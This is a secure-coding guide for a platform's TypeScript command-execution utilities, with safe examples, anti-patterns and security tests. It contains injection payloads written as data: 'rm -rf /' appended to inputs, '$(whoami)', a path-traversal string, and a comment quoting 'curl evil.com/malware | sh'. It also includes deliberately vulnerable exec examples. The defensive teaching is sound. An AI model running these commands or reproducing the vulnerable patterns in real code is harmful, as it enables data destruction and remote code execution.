# Secure Command Execution Examples

This file demonstrates how to use the safe command execution utilities in the Stampcoin Platform.

## Basic Usage

### Executing a Simple Command

```typescript
import { safeExecute } from '../server/utils/safe-command';

// ✅ SECURE: Execute command with array arguments
async function listFiles(directory: string) {
  const result = await safeExecute('ls', ['-la', directory]);
  
  if (result.exitCode === 0) {
    console.log('Files:', result.stdout);
  } else {
    console.error('Error:', result.stderr);
  }
}
```

### Reading a File Safely

```typescript
import { safeReadFile } from '../server/utils/safe-command';

// ✅ SECURE: Safe file reading with path validation
async function readUserFile(filename: string) {
  try {
    const baseDir = '/home/user/uploads';
    const result = await safeReadFile(filename, baseDir);
    
    if (result.exitCode === 0) {
      return result.stdout;
    } else {
      throw new Error(`Failed to read file: ${result.stderr}`);
    }
  } catch (error) {
    console.error('Security error:', error);
    return null;
  }
}

// Example usage
const content = await readUserFile('document.txt'); // ✅ Safe
await readUserFile('../../../etc/passwd'); // ❌ Throws error: Directory traversal
```

### Installing npm Packages

```typescript
import { safeNpmInstall, isValidPackageName } from '../server/utils/safe-command';

// ✅ SECURE: Install package with validation
async function installPackage(packageName: string) {
  // Validate package name first
  if (!isValidPackageName(packageName)) {
    throw new Error('Invalid package name');
  }
  
  const result = await safeNpmInstall(packageName, {
    cwd: '/path/to/project',
    timeout: 60000, // 1 minute
  });
  
  if (result.exitCode === 0) {
    console.log('Package installed successfully');
  } else {
    console.error('Installation failed:', result.stderr);
  }
}

// Example usage
await installPackage('express'); // ✅ Safe
await installPackage('express; rm -rf /'); // ❌ Throws error: Invalid package name
```

### Streaming Output

```typescript
import { safeSpawn } from '../server/utils/safe-command';

// ✅ SECURE: Execute with streaming output
async function buildProject() {
  const { process, promise } = safeSpawn('npm', ['run', 'build'], {
    onStdout: (data) => {
      console.log('[BUILD]', data.trim());
    },
    onStderr: (data) => {
      console.error('[ERROR]', data.trim());
    },
    timeout: 300000, // 5 minutes
  });
  
  const result = await promise;
  
  if (result.exitCode === 0) {
    console.log('Build completed successfully');
  } else {
    console.error('Build failed');
  }
}
```

## Advanced Usage

### Processing Multiple Files

```typescript
import { safeExecute, sanitizeFilePath } from '../server/utils/safe-command';

async function processFiles(filenames: string[], baseDir: string) {
  const results = [];
  
  for (const filename of filenames) {
    try {
      // Sanitize each filename
      const safePath = sanitizeFilePath(filename, baseDir);
      
      // Process the file
      const result = await safeExecute('wc', ['-l', safePath]);
      
      if (result.exitCode === 0) {
        results.push({
          file: filename,
          lines: parseInt(result.stdout.trim().split(' ')[0]),
        });
      }
    } catch (error) {
      console.error(`Skipping invalid file: ${filename}`, error);
    }
  }
  
  return results;
}
```

### Custom Environment Variables

```typescript
import { safeExecute } from '../server/utils/safe-command';

async function runWithCustomEnv() {
  const result = await safeExecute('node', ['script.js'], {
    env: {
      ...process.env,
      NODE_ENV: 'production',
      API_KEY: process.env.API_KEY,
    },
    cwd: '/path/to/project',
  });
  
  return result;
}
```

### Validating User Input

```typescript
import { isValidFilename, sanitizeFilePath } from '../server/utils/safe-command';

function handleUserUpload(userFilename: string, userPath: string) {
  // Validate filename
  if (!isValidFilename(userFilename)) {
    throw new Error('Invalid filename. Only alphanumeric, dash, underscore, and dot allowed.');
  }
  
  // Validate and sanitize path
  const baseDir = '/var/uploads';
  const safePath = sanitizeFilePath(userPath, baseDir);
  
  // Now safe to use
  return safePath;
}

// Examples
handleUserUpload('document.pdf', 'users/john'); // ✅ Valid
handleUserUpload('file; rm -rf', 'users/john'); // ❌ Throws: Invalid filename
handleUserUpload('document.pdf', '../../../etc'); // ❌ Throws: Directory traversal
```

## Integration Examples

### Express API Endpoint

```typescript
import express from 'express';
import { safeExecute, isValidFilename } from '../server/utils/safe-command';

const app = express();

app.post('/api/convert-file', async (req, res) => {
  const { filename, format } = req.body;
  
  // Validate inputs
  if (!isValidFilename(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  if (!['pdf', 'png', 'jpg'].includes(format)) {
    return res.status(400).json({ error: 'Invalid format' });
  }
  
  try {
    // Safe execution
    const result = await safeExecute('convert', [
      `/uploads/${filename}`,
      `/converted/${filename}.${format}`,
    ]);
    
    if (result.exitCode === 0) {
      res.json({ success: true, output: result.stdout });
    } else {
      res.status(500).json({ error: result.stderr });
    }
  } catch (error) {
    res.status(500).json({ error: 'Conversion failed' });
  }
});
```

### tRPC Procedure

```typescript
import { z } from 'zod';
import { publicProcedure } from './trpc';
import { safeExecute, isValidPackageName } from '../server/utils/safe-command';

const installPackageProcedure = publicProcedure
  .input(z.object({
    packageName: z.string(),
  }))
  .mutation(async ({ input }) => {
    const { packageName } = input;
    
    // Validate package name
    if (!isValidPackageName(packageName)) {
      throw new Error('Invalid package name');
    }
    
    // Install package safely
    const result = await safeExecute('npm', ['install', packageName], {
      cwd: '/tmp/project',
      timeout: 120000, // 2 minutes
    });
    
    return {
      success: result.exitCode === 0,
      output: result.stdout,
      errors: result.stderr,
    };
  });
```

### Background Job

```typescript
import { safeSpawn } from '../server/utils/safe-command';

async function processVideoInBackground(videoId: string, filepath: string) {
  const { process, promise } = safeSpawn('ffmpeg', [
    '-i', filepath,
    '-c:v', 'libx264',
    '-preset', 'medium',
    '-crf', '23',
    `/output/video-${videoId}.mp4`,
  ], {
    onStdout: (data) => {
      // Update progress in database
      console.log('Progress:', data);
    },
    onStderr: (data) => {
      // ffmpeg outputs to stderr
      console.log('FFmpeg:', data);
    },
    timeout: 3600000, // 1 hour
  });
  
  const result = await promise;
  
  return {
    success: result.exitCode === 0,
    videoId,
  };
}
```

## Anti-Patterns (What NOT to Do)

### ❌ INSECURE: String Concatenation

```typescript
import { exec } from 'child_process';

// ❌ VULNERABLE to shell injection
async function badExample(filename: string) {
  exec(`cat ${filename}`, (error, stdout) => {
    // If filename is "file.txt; rm -rf /", this executes both commands!
    console.log(stdout);
  });
}
```

### ❌ INSECURE: Template Literals

```typescript
import { exec } from 'child_process';

// ❌ VULNERABLE to shell injection
async function anotherBadExample(packageName: string) {
  exec(`npm install ${packageName}`, (error, stdout) => {
    // If packageName is "express && curl evil.com/malware | sh", this is dangerous!
    console.log(stdout);
  });
}
```

### ❌ INSECURE: Using shell: true

```typescript
import { spawn } from 'child_process';

// ❌ VULNERABLE when shell: true is used
function stillBad(command: string) {
  const child = spawn(command, [], { shell: true });
  // This allows shell injection
}
```

## Testing Your Code

Always test your command execution with malicious input:

```typescript
import { describe, it, expect } from 'vitest';
import { safeExecute } from '../server/utils/safe-command';

describe('Security Tests', () => {
  it('should not execute injected commands', async () => {
    const maliciousInput = 'file.txt; rm -rf /';
    const result = await safeExecute('cat', [maliciousInput]);
    
    // Should fail to find file, not execute rm command
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('No such file');
  });
  
  it('should handle command substitution attempts', async () => {
    const maliciousInput = 'file.txt $(whoami)';
    const result = await safeExecute('cat', [maliciousInput]);
    
    // Should try to read file with literal name, not execute whoami
    expect(result.exitCode).not.toBe(0);
  });
});
```

## References

- [Secure Command Execution Guidelines](./docs/SECURE_COMMAND_EXECUTION.md)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

## Questions?

If you have questions about secure command execution, please:
1. Read the [Security Guidelines](./docs/SECURE_COMMAND_EXECUTION.md)
2. Check the [Security Policy](./SECURITY.md)
3. Contact the security team at security@stampcoin.platform
